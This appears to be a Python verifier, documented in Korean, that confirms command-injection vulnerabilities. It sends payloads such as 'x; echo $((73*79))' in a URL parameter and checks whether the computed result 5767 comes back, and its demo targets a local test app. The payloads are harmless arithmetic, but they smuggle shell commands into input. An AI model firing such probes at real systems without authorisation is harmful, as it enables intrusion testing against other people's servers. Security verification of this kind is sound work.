"""
명령어 주입(Command Injection, A03) 검증기 — 결정론, LLM 없음.

핵심 트릭: '실행돼야만 나오는 값'을 확인한다.
  주입 payload 에 산술식(73*79)을 넣는다.
  - 실행되면      → 서버가 계산한 결과 '5767' 이 응답에 나온다(payload 원문엔 없음)
  - 그냥 반사되면 → "73*79" 라는 글자만 보이고 '5767' 은 없다
  → '5767' 이 보이면 명령이 진짜 실행된 것. 셸/OS 별로 분리자·문법이 달라 여러 개 시도.
"""
import urllib.request
import urllib.parse
import urllib.error

RESULT = "5767"   # 73 * 79
PAYLOADS = ["x& set /a 73*79", "x; expr 73 \\* 79", "x; echo $((73*79))", "x| echo $((73*79))"]


def fetch(base_url, param, value):
    url = base_url + "?" + urllib.parse.urlencode({param: value})
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def verify(base_url, param="host"):
    for p in PAYLOADS:
        _, body = fetch(base_url, param, p)
        if RESULT in body:
            return ("CONFIRMED",
                    "주입한 산술식이 서버에서 실제 계산됨(73*79=5767) → 명령 실행",
                    {"payload": p, "response": body})
    return "FALSE_POSITIVE", "명령 분리자가 차단되거나 실행되지 않음", {"tried": PAYLOADS}


if __name__ == "__main__":
    from vuln_app import serve_in_thread
    srv = serve_in_thread(8021)
    print("/ping", verify("http://127.0.0.1:8021/ping")[0])
    srv.shutdown()
